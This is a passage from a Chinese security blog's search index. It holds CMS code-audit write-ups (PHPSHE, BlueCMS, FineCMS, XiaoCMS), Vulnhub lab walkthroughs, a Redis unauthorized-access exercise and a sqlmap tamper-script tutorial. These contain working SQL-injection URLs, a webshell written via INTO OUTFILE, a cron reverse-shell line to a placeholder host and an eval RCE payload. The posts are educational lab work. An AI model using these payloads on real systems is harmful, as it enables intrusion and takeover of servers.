文件格式不正确!'; exit(); &#125; &#125; return true; &#125; $this-&gt;limit_type通过set_limit_type函数获取，搜索set_limit_type 在admin/controller/uploadfile.php中发现upload函数 1234567private function upload($fields, $type, $size) &#123; $upload = xiaocms::load_class('upload'); $ext = strtolower(substr(strrchr($_FILES[$fields]['name'], '.'), 1));………… $result = $upload-&gt;set_limit_size(1024*1024*$size)-&gt;set_limit_type($type)-&gt;upload($_FILES[$fields],XIAOCMS_PATH.$filenpath);…… 同样在admin/controller/uploadfile.php中发现uploadify_uploadAction函数 1234567891011/![10](D:\hexo\source\_posts\XiaoCMS漏洞分析\10.png)** * uploadify_upload */ public function uploadify_uploadAction() &#123; $type = $this-&gt;get('type'); $size = (int)$this-&gt;get('size'); if ($this-&gt;post('submit')) &#123; $data = $this-&gt;upload('file', explode(',', $type), $size); if ($data['result']) echo $data['path']; &#125; &#125; $this-&gt;limit_type与$this-&gt;limit_size都可以控制了，接下来构造upload.html 上传shell 0x03 后台模板写shell漏洞位于admin/controller/template.php editAction函数 123456789public function editAction() &#123; …… if ($this-&gt;post('submit')) &#123; file_put_contents($filepath, htmlspecialchars_decode($this-&gt;post('file_content')), LOCK_EX); $this-&gt;show_message('提交成功',1); &#125; $filecontent = htmlspecialchars(file_get_contents($filepath)); include $this-&gt;admin_tpl('template_add'); &#125; 前面提到过get post到的内容都被htmlspecialchars转义了，而这里又用htmlspecialchars_decode反转义了 0x04 总结htmlspecialchars和MySQL PDO是真的难受……]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vulnhub JJS-CTF]]></title>
    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
      <categories>
        <category>Challenge</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VulnHub-LazySysAdmin]]></title>
    <url>%2F2018%2F10%2F05%2FVulnHub-LazySysAdmin%2F</url>
    <content type="text"><![CDATA[主要考察信息收集 0x01 前期试探使用nmap进行扫描,发现存在如下端口 可以做出简单的分析 端口 作用 22 SSH登陆 80 Web应用 445 共享文件 3306 MySql 使用御剑扫描下Web应用存在PHPMyAdmin与WordPress，和robots.txt文件robots.txt访问后发现没有多大用处,phpmyadmin与wordpress没有账号密码也并不好突破，不过在wordpress处获得了一个可能的账号togie 0x02 突破点Find因为其开放了445端口，所以用enum4linux尝试进行扫描可以看到share是OK的 windows下获取共享资源1net use k: \\10.10.10.132\share$ linux下获取共享资源1mount -t cifs -o username='',password='' //10.10.10.132/share$ /mnt 对得到文件进行查看在deets.txt文件中发现一个密码 再加上刚开始得到的一个可能的账号，首先尝试了下ssh连接没想到直接成功了,切换到root账户，完成 0x03 Web渗透0x01 WebShell这样就直接拿到Shell了？多少有些无趣，看了下wordpress的config文件找到了数据库的账号和密码记得刚才扫的有phpmyadmin目录，登陆成功，不过权限太低了，只好放弃尝试下登陆wordpress,没想到还是数据库的账号密码登陆上去了在404界面写入反弹shell得到WebShell 0x02 提权开坑待填…… 0x04 总结总的来说是一个比较简单的challange,基本上只要掌握了enum4linux以及获取共享资源的方法就可以，继续加油。]]></content>
      <categories>
        <category>Challenge</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPSHE1.5漏洞分析]]></title>
    <url>%2F2018%2F10%2F05%2FPHPSHE1-5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析 0x01 后台登陆逻辑漏洞漏洞描述后台登陆处无视验证码，可以进行爆破 漏洞利用密码输入错误时跳转到登陆界面 密码输入正确跳转的链接 可以根据返回内容不同进行爆破找到密码 漏洞分析代码位于/module/admin/do.php 123456789101112131415161718if (isset($_p_pesubmit)) &#123; $sql_set['admin_name'] = $_p_admin_name; $sql_set['admin_pw'] = md5($_p_admin_pw); if ($info = $db-&gt;pe_select('admin', pe_dbhold($sql_set))) &#123; strtolower($_s_authcode) != strtolower($_p_authcode) &amp;&amp; pe_error('验证码错误...'); $db-&gt;pe_update('admin', array('admin_id'=&gt;$info['admin_id']), array('admin_ltime'=&gt;time())); $_SESSION['admin_idtoken'] = md5($info['admin_id'].$pe['host_root']); $_SESSION['admin_id'] = $info['admin_id']; $_SESSION['admin_name'] = $info['admin_name']; $_SESSION['pe_token'] = pe_token_set($_SESSION['admin_idtoken']); pe_success('登录成功！', 'admin.php'); &#125; else &#123; pe_error('用户名或密码错误...'); &#125; &#125; $seo = pe_seo('管理员登录', '', '', 'admin'); include(pe_tpl('do_login.html')); 可以看到，这个登陆逻辑是先判断账号密码是否正确，之后再判断验证码是否正确 0x02 后台SQL注入漏洞描述在传递某些参数时未经过过滤，导致SQL注入 漏洞利用0x01 admin.php?mod=user1http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23 可以看到，注入成功，并且爆出了绝对路径 写入一句话 1http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20'&lt;?php @eval($_POST[a])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile "D:\\wamp64\\www\\phpshe1.5\\shell.php"%23 可以看到一句话已经写入 使用菜刀连接 0x02 admin.php?mod=user&amp;act=email1http://localhost/phpshe1.5/admin.php?mod=user&amp;act=email&amp;id=1') union select * from ((select user())A join (select user())b join (select user())c join (select user())d join (select user())e join (select user())f join (select user())g join (select user())h join (select user())i join (select user())j join (select user())k join (select user())l join (select user())m join (select user())n join (select user())o join (select user())p join (select user())q join (select user())r )# 利用成功 除了payload不一样外其余操作与上一个漏洞基本一样 漏洞分析0x01代码位于/module/admin/user.php 1234567891011121314151617$_g_name &amp;&amp; $sqlwhere .= " and `user_name` like '%&#123;$_g_name&#125;%'"; $_g_phone &amp;&amp; $sqlwhere .= " and `user_phone` like '%&#123;$_g_phone&#125;%'"; $_g_email &amp;&amp; $sqlwhere .= " and `user_email` like '%&#123;$_g_email&#125;%'"; if (in_array($_g_orderby, array('ltime|desc', 'point|desc', 'ordernum|desc'))) &#123; $orderby = explode('|', $_g_orderby); $sqlwhere .= " order by `user_&#123;$orderby[0]&#125;` &#123;$orderby[1]&#125;"; &#125; else &#123; $sqlwhere .= " order by `user_id` desc"; &#125; $info_list = $db-&gt;pe_selectall('user', $sqlwhere, '*', array(20, $_g_page)); $tongji['user'] = $db-&gt;pe_num('user'); $tongji['useraddr'] = $db-&gt;pe_num('useraddr'); $tongji['userbank'] = $db-&gt;pe_num('userbank'); $seo = pe_seo($menutitle='会员列表', '', '', 'admin'); include(pe_tpl('user_list.html')); $_g_name是定义在common.php文件中 12345678if (get_magic_quotes_gpc()) &#123; !empty($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, '_g'); !empty($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, '_p');&#125;else &#123; !empty($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,'_g'); !empty($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,'_p');&#125; extract将GET与POST的参数加上_g_并成为变量,并未做防范sql注入的过滤 所以构造payload： 1mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23 即可 0x02代码同样位于/module/admin/user.php 12345678910111213141516171819202122232425262728case 'email': if (isset($_p_pesubmit)) &#123; pe_token_match(); !$_p_email_user &amp;&amp; pe_error('收件人必须填写...'); !$_p_email_name &amp;&amp; pe_error('邮件标题必须填写...'); !$_p_email_text &amp;&amp; pe_error('邮件内容必须填写...'); $email_user = explode(',', $_p_email_user); foreach ($email_user as $k=&gt;$v) &#123; if (!$v) continue; $noticelog_list[$k]['noticelog_user'] = pe_dbhold($v); $noticelog_list[$k]['noticelog_name'] = pe_dbhold($_p_email_name); $noticelog_list[$k]['noticelog_text'] = $_p_email_text; $noticelog_list[$k]['noticelog_atime'] = time(); &#125; if ($db-&gt;pe_insert('noticelog', $noticelog_list)) &#123; pe_success('发送成功!', '', 'dialog'); &#125; else &#123; pe_error('发送失败...'); &#125; &#125; $info_list = $db-&gt;pe_selectall('user', array('user_id'=&gt;explode(',', $_g_id))); $email_user = array(); foreach ($info_list as $v) &#123; $v['user_email'] &amp;&amp; $email_user[] = $v['user_email']; &#125; $seo = pe_seo($menutitle='发送邮件', '', '', 'admin'); include(pe_tpl('user_email.html')); 其中 1$info_list = $db-&gt;pe_selectall('user', array('user_id'=&gt;explode(',', $_g_id))); 的$_g_id直接GET到后未进行过滤，不过有一个explode函数使得union select不太好使了，恰巧有个不用逗号的方法 1union select * from ((select user())A join (select user())b join (select user())c) 附上一段构造payload的python代码 123456789101112131415#coding=utf-8#union select * from ((select 1)A join (select 2)B join (select 3)C);#Max length 26import stringdic = string.ascii_lettersdef print_payload(col_length,content): payload = "union select * from ((select &#123;0&#125;)A ".format(content) for i in range(col_length-1): payload += "join (select &#123;0&#125;)&#123;1&#125; ".format(content,dic[i+1]) payload += ")" print(payload)print_payload(18,"user()") 0x03 总结果然爆破才是最强的]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BlueCMS 代码审计]]></title>
    <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[finecms免费版漏洞分析]]></title>
    <url>%2F2018%2F10%2F03%2Ffinecms%E5%85%8D%E8%B4%B9%E7%89%88%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[FineCMS是一款基于PHP+MySql+CI框架开发的高效简洁的中小型内容管理系统 0x00 开始前的准备网上存在许多5.0.X的漏洞分析，本来想找个5.0.x版本的进行分析，结果最后只找到了一个免费版 0x01 寻找漏洞在\extensions\下的function.php文件下有一个函数 其中的 1@eval("\$array = $data;"); 很明显存在漏洞，先测试下 Payload:?a=array();phpinfo() 0x02 漏洞利用回到CMS中，找一下哪里用了这个函数，在function.php文件里发现了一个fn_authcode函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * authcode函数(用于数组) */function fn_authcode($data, $operation = 'DECODE', $key = '', $expiry = 0) &#123; $ckey_length = 4; $string = $operation == 'DECODE' ? $data : array2string($data); $key = md5($key ? $key : SITE_MEMBER_COOKIE); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == 'DECODE') &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123; return string2array(substr($result, 26)); &#125; else &#123; return ''; &#125; &#125; else &#123; return $keyc . str_replace('=', '', base64_encode($result)); &#125;&#125; 发现这个函数在ApiController.php文件中被调用 1$data = fn_authcode(base64_decode($this-&gt;get('file')), 'DECODE'); 这里的file可控，现在只要构造合适的file就可以达成命令执行了,回到fn_authocode函数，这是一个只和SITE_MEMBER_COOKIE有关的函数，而SITE_MEMBER_COOKIE又是一个默认的值，只要将fn_authcode的参数改一下就可以构造成我们要的payload 尝试下 1http://localhost/finecms/?c=api&amp;a=down&amp;file=ZmZlMXhvY3N4ZWluZnpuSEoyUGRBRkhPZ01rcGRQbFdLZ1RJT3pSaG0rR21ab1JyRS96c1dnMnFJT1dTMUVn 0x03 总结这一次漏洞分析还是异常吃力，漏洞函数很容易就发现了，但是漏洞利用的地方找了半天，除此之外就是fn_authocode函数的加解密，长见识了，对网站的整体结构了解还是不够，继续努力。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vulnhub FristiLeaks]]></title>
    <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
    <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
      <categories>
        <category>Challenge</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis未授权访问]]></title>
    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap --tamper脚本编写]]></title>
    <url>%2F2018%2F10%2F01%2Fsqlmap-tamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[工欲善其事,必先利其器 0x01 tamper脚本在没有WAF的情况下使用Sqlmap注入网站基本上是无往不利，但是WAF的存在使得注入变得艰难，而tamper脚本可以在大多数情况下完成自动化注入 0x02 tamper脚本分析本文仅选择lowercase.py进行分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""import refrom lib.core.data import kb #导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kbfrom lib.core.enums import PRIORITY#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py__priority__ = PRIORITY.NORMAL#定义优先级为一般def dependencies(): passdef tamper(payload, **kwargs):#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;'a': 1, 'c': 3, 'b': 2&#125; """ Replaces each keyword character with lower case value Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 Notes: * Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions &gt;&gt;&gt; tamper('INSERT') 'insert' """ retVal = payload if payload: for match in re.finditer(r"\b[A-Za-z_]+\b", retVal): word = match.group()#循环遍历每个单词 if word.upper() in kb.keywords:#如果是SQL中的关键词则替换为小写 retVal = retVal.replace(word, word.lower()) return retVal#返回替换后的payload 0x03 编写tamper脚本sqli-labs第36关 Bypass MYSQL_real_escape_string,绕过mysql_real_escape_string的方法本文不再累述,编写一个tamper脚本，使得payload中第一个单引号前加上%df 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python#coding:utf-8"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""from lib.core.data import kbfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): """ Tested against: * MySQL * gbk,mysql_real_escape_string &gt;&gt;&gt; tamper('1' and sleep(10) ') '1%df' and sleep(10)' """ retVal = "" if payload: first = False for i in payload: if i == '\'' and not first: retVal += '%df\'' first = True else: retVal += i return retVal 0x04 使用tamper脚本测试下脚本是否给力 1python2 .\sqlmap.py -u "http://localhost/sqli-labs/Less-36/?id=1" --tamper=gbk.py --dbs]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F09%2F27%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
